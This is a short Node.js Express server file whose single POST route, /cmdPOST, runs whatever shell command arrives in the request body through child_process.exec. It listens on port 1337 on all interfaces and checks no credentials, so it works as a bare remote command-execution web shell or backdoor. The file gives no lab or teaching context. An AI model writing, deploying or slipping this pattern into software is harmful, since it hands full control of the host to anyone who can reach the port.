const bodyParser = require('body-parser')
const express = require('express')
const app = express()
const { exec } = require("child_process");

app.use(express.json())
app.use(express.urlencoded())



app.post('/cmdPOST',(req,res)=>{

    exec(req.body.cmd,(err, stdout, stderr) =>{
        output = stdout + stderr;
        console.log(output);
    });
})


app.listen(1337,"0.0.0.0",()=>{
    console.log("App is started on 0.0.0.0:1337")
})